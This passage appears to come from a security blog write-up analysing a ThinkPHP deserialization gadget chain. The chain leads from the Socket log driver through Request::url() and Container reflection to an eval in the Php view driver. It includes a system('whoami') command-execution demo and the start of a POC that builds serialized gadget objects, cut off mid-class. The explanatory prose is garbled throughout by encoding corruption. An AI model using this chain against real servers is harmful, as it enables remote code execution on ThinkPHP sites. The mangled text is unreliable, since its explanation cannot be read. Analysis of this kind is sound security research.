<p>ÊúÄÂêéÊàêÂäüÈÄöËøácheck()ÂáΩÊï∞„ÄÇÂõûÂà∞save()ÂáΩÊï∞ÔºåÈÄöËøáÊéßÂà∂<code>$this-&gt;config['debug']</code>‰∏∫trueÔºå‰ªéËÄåËøõÂÖ•Âà∞ifÊù°‰ª∂Ôºö</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503051546505.png"
	
	
	
	loading="lazy"
	
		alt="image-20250305154615447"
	
	
></p>
<p>ÁÑ∂ÂêéËøôÈáåÊòØÂ∞Ü<code>$this-&gt;app</code>ËÆæÁΩÆ‰∏∫‰∫Ü<code>think\APP</code>Á±ªÔºå‰ΩÜÊòØËøô‰∏™APPÁ±ªÊ≤°Êúâexists()ÊñπÊ≥ïÔºå‰ºöË∞ÉÁî®Âà∞Áà∂Á±ªContainerÂæóexists()ÊñπÊ≥ïÔºö</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503051549361.png"
	
	
	
	loading="lazy"
	
		alt="image-20250305154913303"
	
	
></p>
<p>‰ªéÊ≥®Èáä‰∏≠ÂèØ‰ª•ÁúãÂá∫ËøôÈáåÂ∞±ÊòØÂú®Âà§Êñ≠ÂÆπÂô®‰∏≠ÊòØÂê¶ÊúâÁã¨‰∫´ÂÆû‰æãÔºåÂèÇÊï∞‰º†ÈÄí‰∏≠ÂèØ‰ª•ÁúãÂá∫ËøôÈáåÊòØÂà§Êñ≠ÊòØÂê¶ÊúârequestËøô‰∏™Á±ªÁöÑÂÆû‰æãÔºåË∑üËøõËøô‰∏™getAlias()ÊñπÊ≥ïÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">getAlias</span><span class="p">(</span><span class="nx">string</span> <span class="nv">$abstract</span><span class="p">)</span><span class="o">:</span> <span class="nx">string</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">bind</span><span class="p">[</span><span class="nv">$abstract</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$bind</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">bind</span><span class="p">[</span><span class="nv">$abstract</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">is_string</span><span class="p">(</span><span class="nv">$bind</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getAlias</span><span class="p">(</span><span class="nv">$bind</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$abstract</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÂØπ‰∫éÁ¨¨‰∏Ä‰∏™ifËØ≠Âè•ÔºåË∑üËøõÂà§Êñ≠ÁöÑ<code>$this-&gt;bind[$abstract]</code>ÔºåÁî±‰∫éËøôÈáåÁöÑ<code>$this</code>Ë∞ÉÁî®ÂÖ≥Á≥ªÔºåËøôÈáåÂà§Êñ≠ÁöÑÊòØAppÁ±ªÁöÑbindÂèòÈáèÔºö</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503051634072.png"
	
	
	
	loading="lazy"
	
		alt="image-20250305163438010"
	
	
></p>
<p>ÂèØ‰ª•ÁúãÂà∞ËøôÈáåÊòØÁªëÂÆöÂà∞ÊúâRequest.classÁ±ªÁöÑÔºåÊâÄ‰ª•ËøôÈáåÁöÑgetAlias()ÊñπÊ≥ïÊúÄÂêéÊòØ‰ºöËøîÂõûËøô‰∏™RequestÁ±ªÁöÑÂÆåÂÖ®ÂåÖÂêçÔºå‰πüÂ∞±ÊòØ‰ºöËøîÂõûthink\Request„ÄÇÁÑ∂ÂêéÂõûÂà∞exists()ÊñπÊ≥ïÔºå‰ºöÂà§Êñ≠ÊòØÂê¶ÊúâÂÆû‰æãÂåñÁ±ªÔºå‰πüÂ∞±ÊòØ<code>$this-&gt;instance['think\Request']</code>Ë¶Å‰∏∫trueÔºåÂêåÊ†∑ÂèØ‰ª•Áõ¥Êé•Âú®Á±ªÂàùÂßãÂåñÊó∂ËÆæÁΩÆÔºåÊØîÂ¶Ç<code>$this-&gt;instance</code>ËµãÂÄº‰∏∫<code>['think\Request'=&gt;new Request()]</code>„ÄÇ</p>
<p>ÊúÄÂêéÂõûÂà∞SocketÊñá‰ª∂ÁöÑsave()ÊñπÊ≥ïÔºåÁÑ∂ÂêéÂ∞±‰ºöË∞ÉÁî®RequestÁ±ªÁöÑurl()ÊñπÊ≥ïÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">url</span><span class="p">(</span><span class="nx">bool</span> <span class="nv">$complete</span> <span class="o">=</span> <span class="k">false</span><span class="p">)</span><span class="o">:</span> <span class="nx">string</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">url</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$url</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">url</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">server</span><span class="p">(</span><span class="s1">&#39;HTTP_X_REWRITE_URL&#39;</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$url</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">server</span><span class="p">(</span><span class="s1">&#39;HTTP_X_REWRITE_URL&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">server</span><span class="p">(</span><span class="s1">&#39;REQUEST_URI&#39;</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$url</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">server</span><span class="p">(</span><span class="s1">&#39;REQUEST_URI&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">server</span><span class="p">(</span><span class="s1">&#39;ORIG_PATH_INFO&#39;</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$url</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">server</span><span class="p">(</span><span class="s1">&#39;ORIG_PATH_INFO&#39;</span><span class="p">)</span> <span class="o">.</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">server</span><span class="p">(</span><span class="s1">&#39;QUERY_STRING&#39;</span><span class="p">))</span> <span class="o">?</span> <span class="s1">&#39;?&#39;</span> <span class="o">.</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">server</span><span class="p">(</span><span class="s1">&#39;QUERY_STRING&#39;</span><span class="p">)</span> <span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;argv&#39;</span><span class="p">][</span><span class="mi">1</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$url</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;argv&#39;</span><span class="p">][</span><span class="mi">1</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$url</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$complete</span> <span class="o">?</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">domain</span><span class="p">()</span> <span class="o">.</span> <span class="nv">$url</span> <span class="o">:</span> <span class="nv">$url</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÂèØ‰ª•ÊéßÂà∂urlÂèòÈáèÔºåÊµãËØï‰∫Ü‰∏Ä‰∏ãËøôÈáåÁöÑifËØ≠Âè•ÔºåÂè™Ë¶ÅÊúâÁªô<code>$this-&gt;url</code>ËµãÂÄºÔºåÈÇ£‰πàËøôÈáåÁöÑifËØ≠Âè•Â∞±‰∏∫ÁúüÔºåÂà§Êñ≠ËßÑÂàôÂ¶Ç‰∏ãÔºö</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503051710058.png"
	
	
	
	loading="lazy"
	
		alt="image-20250305171031997"
	
	
></p>
<p>ÊâÄ‰ª•Êàë‰ª¨ÂèØ‰ª•Áªô<code>$url</code>ËµãÂÄº‰∏∫‰ªªÊÑèÂÄº„ÄÇ</p>
<p>Âú®ÊúÄÂêéÁöÑreturnËØ≠Âè•ÔºåÁî±‰∫éÂèÇÊï∞ÁöÑ‰º†ÈÄíÔºå‰ºöË∞ÉÁî®<code>$this-&gt;domain()</code>ÊñπÊ≥ïÔºåÁÑ∂ÂêéÊòØ‰∏Ä‰∏™ÊãºÊé•urlÂÄºÂæóÊìç‰ΩúÔºåË∑üËøõ‰∏Ä‰∏ãËøôÈáåÂæódomain()ÊñπÊ≥ïÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">domain</span><span class="p">(</span><span class="nx">bool</span> <span class="nv">$port</span> <span class="o">=</span> <span class="k">false</span><span class="p">)</span><span class="o">:</span> <span class="nx">string</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">scheme</span><span class="p">()</span> <span class="o">.</span> <span class="s1">&#39;://&#39;</span> <span class="o">.</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">host</span><span class="p">(</span><span class="nv">$port</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Ë∞ÉÁî®domain()ÊñπÊ≥ïÊó∂Ê≤°Êúâ‰º†ÂèÇÔºåÊâÄ‰ª•ËøôÈáåÁöÑ<code>$port</code>‰∏∫falseÔºåÊñπÊ≥ïÂÜÖÂÆπÂ∞±ÊòØËé∑ÂèñÂçèËÆÆÂ§¥ÂíåÂüüÂêçÁöÑÊìç‰ΩúÔºå‰πüÂ∞±ÊòØËé∑ÂèñÂåÖÂê´ÂΩìÂâçÂçèËÆÆÁöÑÂüüÂêçÔºå‰ΩÜÊòØËøôÈáå‰ºöÁõ¥Êé•ËøîÂõûÊàë‰ª¨ÂèØÊéßÁöÑhostÁöÑÂÄºÔºå‰ª£Á†ÅÈÄªËæëÂ¶Ç‰∏ãÔºö</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503051716668.png"
	
	
	
	loading="lazy"
	
		alt="image-20250305171638601"
	
	
></p>
<p>ÂèÇÊï∞‰º†ÈÄíÔºå‰ºöËÆ©<code>$strict</code>ÂèòÈáèËÆæÁΩÆ‰∏∫falseÔºåÂú®‰∏âÁõÆËøêÁÆóÁ¨¶‰∏≠‰ºöÂæóÂà∞ÂêéÈù¢ÁöÑÈÇ£‰∏™ÂÄºÔºå‰πüÂ∞±ÊòØ<code>$host</code>ÁöÑÂÄº„ÄÇ</p>
<p>ÊúÄÂêéË∞ÉÁî®ÂÆåurl()ÂáΩÊï∞ËøáÂêéÔºåÂõûÂà∞save()ÊñπÊ≥ïÔºå‰ºöÂ∞ÜËøîÂõûÁöÑÂÄºËµãÂÄºÁªô<code>$currentUri</code>ÂèòÈáèÔºö</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503051722130.png"
	
	
	
	loading="lazy"
	
		alt="image-20250305172226063"
	
	
></p>
<p>ÁÑ∂ÂêéËøôÈáåÂè™Ë¶ÅÊéßÂà∂<code>$this-&gt;config['format_head']</code>‰∏ç‰∏∫Á©∫ÔºåÂ∞±ÂèØ‰ª•Ë∞ÉÁî®Âà∞think\AppÁ±ªÁöÑinvoke()ÊñπÊ≥ïÔºåËÄåËøô‰∏™<code>$this-&gt;config['format_head']</code>ÔºåÂêåÊ†∑ÊòØÂèØÊéßÁöÑÔºåËÄåthink\AppÊòØÊ≤°Êúâinvoke()ÊñπÊ≥ïÁöÑÔºåÂÖ∂ÂÆûËøòÊòØË∞ÉÁî®ÁöÑÁà∂Á±ªContainerÁöÑinvoke()ÊñπÊ≥ïÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">invoke</span><span class="p">(</span><span class="nv">$callable</span><span class="p">,</span> <span class="k">array</span> <span class="nv">$vars</span> <span class="o">=</span> <span class="p">[],</span> <span class="nx">bool</span> <span class="nv">$accessible</span> <span class="o">=</span> <span class="k">false</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$callable</span> <span class="nx">instanceof</span> <span class="nx">Closure</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">invokeFunction</span><span class="p">(</span><span class="nv">$callable</span><span class="p">,</span> <span class="nv">$vars</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nx">is_string</span><span class="p">(</span><span class="nv">$callable</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="k">false</span> <span class="o">===</span> <span class="nx">strpos</span><span class="p">(</span><span class="nv">$callable</span><span class="p">,</span> <span class="s1">&#39;::&#39;</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">invokeFunction</span><span class="p">(</span><span class="nv">$callable</span><span class="p">,</span> <span class="nv">$vars</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">invokeMethod</span><span class="p">(</span><span class="nv">$callable</span><span class="p">,</span> <span class="nv">$vars</span><span class="p">,</span> <span class="nv">$accessible</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÁÑ∂ÂêéÈìæÂ≠êÊòØÁúãÁ¨¨‰∏â‰∏™invokeMethod()ÊñπÊ≥ïÔºö</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503051731737.png"
	
	
	
	loading="lazy"
	
		alt="image-20250305173110667"
	
	
></p>
<p>ÂâçÈù¢ÁöÑÂàÜÂâ≤Á±ªÂêçÂíåÊñπÊ≥ïÂêçÁöÑÊìç‰ΩúÔºåÊúÄÂºÄÂßãÊàëÊú¨Êù•ÊòØÊÉ≥Ë¶Å‰ΩøÁî®else‰∏≠ÁöÑÊñπÊ≥ïÊù•ËøõË°åÂàÜÂâ≤ÁöÑÔºåÂêéÈù¢ÊûÑÈÄ†ÁöÑÊó∂ÂÄôÂèëÁé∞ÊúâÁÇπÈóÆÈ¢òÔºåÂè™ËÉΩË¢´Ëß£ÊûêÊàêÂ≠óÁ¨¶‰∏≤Ôºå‰πüÊúâÂèØËÉΩÊòØÊàë‰º†ÂèÇÊ†ºÂºèÊúâÁÇπÈóÆÈ¢òÔºåÂÖ∂ÂÆûËøôÈáå‰ΩøÁî®ÂâçÈù¢ÁöÑifËØ≠Âè•‰∏≠ÁöÑÊù°‰ª∂ÊâçÊòØÊúÄÂ•ΩÁî®ÁöÑÔºåÁõ¥Êé•Áî®‰∏Ä‰∏™Êï∞ÁªÑ‰º†ÂèÇÂç≥ÂèØÔºåÂπ∂‰∏îËøôÈáåËøòÊúâ‰∏™<code>invokeClass()</code>ÊñπÊ≥ïÊù•Á°Æ‰øùÊòØ‰∏Ä‰∏™obejctÂØπË±°„ÄÇÁÑ∂ÂêéÁúã‰∏äÂõæÈáçÁÇπÊ†áÊ≥®Âá∫Êù•ÁöÑÈÉ®ÂàÜÔºåËøôÈáåÊòØ‰∏Ä‰∏™ÂèçÂ∞ÑÊìç‰ΩúÔºåÂíåjavaÁöÑÂæàÂÉèÔºåÂèçÂ∞ÑËé∑ÂèñÁ±ªÂèäÊñπÊ≥ïÔºåÁÑ∂ÂêéÂä®ÊÄÅÊâßË°å„ÄÇ</p>
<p>Âú®ËøôÈáåÔºåÊàë‰ª¨Â∞±ÂèØ‰ª•Êâæ‰∏Ä‰∏ãÊúâÊó†‰ªÄ‰πàÂáΩÊï∞ÂèØ‰ª•Âä®ÊÄÅË∞ÉÁî®,ÂèØ‰ª•Áî®SeayÊ∫ê‰ª£Á†ÅÂÆ°ËÆ°Â∑•ÂÖ∑Ëá™Âä®ÂÆ°ËÆ°‰∏Ä‰∏ãÔºö</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503051743717.png"
	
	
	
	loading="lazy"
	
		alt="image-20250305174305660"
	
	
></p>
<p>ÂèØ‰ª•ÁúãÂà∞Ëøô‰∏™display()ÂáΩÊï∞ÊòØÂ≠òÂú®ÂëΩ‰ª§ÊâßË°åÊºèÊ¥ûÁöÑÔºåÂ≠òÂú®think\view\driver\PhpÊñá‰ª∂‰∏≠ÔºåÁé∞Âú®Â∞±ÊòØÁúãÊÄé‰πàËøõË°åÂèÇÊï∞‰º†ÈÄíÊù•Êâì‰∫ÜÔºåÂèÇÊï∞‰º†ÈÄíÊÑüËßâ‰πüÊòØÂæàÊúâÊÑèÊÄùÁöÑÂëÄÔºö</p>
<p>Âú®explode()ÂáΩÊï∞‰∏≠‰ΩøÁî®<code>::</code>Êù•ÂàÜÂâ≤classÂíåmethodÔºåÊÑüËßâ‰º†ÂèÇÊòØÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">a=new think\view\driver\Php() 
</span></span><span class="line"><span class="cl">a:: display
</span></span></code></pre></td></tr></table>
</div>
</div><p>ËøôÊ†∑ÔºüÊÑüËßâÂÉèÊòØ„ÄÇ</p>
<p>ÁÑ∂ÂêéÂÜç‰ΩøÁî®ReflectionMethod()ÊñπÊ≥ïÊù•ÂèçÂ∞ÑËé∑ÂèñÂà∞Ë¶ÅË∞ÉÁî®ÁöÑÊñπÊ≥ïÔºåÂÜçÁÑ∂Âêé‰ΩøÁî®bindParams()ÊñπÊ≥ïÊù•ÁªëÂÆöÂèÇÊï∞ÔºåÊúÄÂêéË∞ÉÁî®invokeArgs()Êù•ÊâßË°åËøô‰∏™ÊñπÊ≥ï„ÄÇ</p>
<p>ËÄåÂú®ÂëΩ‰ª§ÊâßË°åÊòØÂ¶Ç‰∏ãÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">eval</span><span class="p">(</span><span class="s1">&#39;?&gt;&#39;</span> <span class="o">.</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Â¶Ç‰∏ãÂ∞±ÂèØ‰ª•ËøõË°åÂëΩ‰ª§ÊâßË°åÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nv">$content</span><span class="o">=</span><span class="s2">&#34;\&lt;?php system(&#39;whoami&#39;);?&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">eval</span><span class="p">(</span><span class="s1">&#39;?&gt;&#39;</span> <span class="o">.</span> <span class="nv">$content</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÊâÄ‰ª•‰º†ÂèÇÂ∞±ÈúÄË¶Å‰º†<code>&lt;?php system('whoami');?&gt;</code>Âç≥ÂèØÔºåËøôÈáåÁöÑÂèÇÊï∞‰º†ÈÄíÂÖ∂ÂÆûÂ∞±ÊòØÂâçÈù¢<code>$currentUri</code>ÁöÑÂÜÖÂÆπÔºå‰πüÂ∞±ÊòØÁõ¥Êé•Â∞ÜÂâçÈù¢ÁöÑ<code>$url</code>ËÆæÁΩÆ‰∏∫php‰ª£Á†ÅÂç≥ÂèØ„ÄÇ</p>
<p>ÊúÄÂêéÁöÑPOCÂ¶Ç‰∏ãÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">League\Flysystem\Cached\Storage</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="c1">//abstract class AbstractCache
</span></span></span><span class="line"><span class="cl"><span class="c1">//{
</span></span></span><span class="line"><span class="cl"><span class="c1">//    protected $autosave = false;
</span></span></span><span class="line"><span class="cl"><span class="c1">//}
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">class</span> <span class="nc">Psr6Cache</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$pool</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$autosave</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$a</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">pool</span><span class="o">=</span><span class="nv">$a</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">think\log</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Channel</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$logger</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$event</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$lazy</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$b</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">lazy</span><span class="o">=</span><span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">event</span><span class="o">=</span><span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">logger</span><span class="o">=</span><span class="nv">$b</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">think\view\driver</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Php</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">think\log\driver</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Socket</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$app</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$config</span> <span class="o">=</span><span class="p">[];</span>
